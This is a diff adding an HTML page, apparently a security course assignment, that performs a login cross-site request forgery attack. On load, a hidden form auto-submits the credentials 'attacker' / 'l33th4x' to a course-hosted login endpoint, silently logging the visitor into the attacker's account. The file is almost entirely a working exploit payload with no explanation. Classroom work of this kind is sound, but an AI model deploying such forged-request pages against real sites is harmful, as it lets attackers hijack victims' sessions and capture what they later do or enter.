@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            body {
+                margin : 0;
+                padding : 0;
+                background-color : white;
+            }
+        </style>
+    </head>
+    <form id="loginForm" action="http://cpsc4200.mpese.com/login" method="POST" style="display:none;">
+        <input type="text" name="username" value="attacker">
+        <input type="password" name="password" value="l33th4x">
+        <input type="submit" value="Login">
+    </form>
+
+    <script>
+        window.onload = function() {
+            document.getElementById('loginForm').submit();
+        }
+    </script>
+</html>
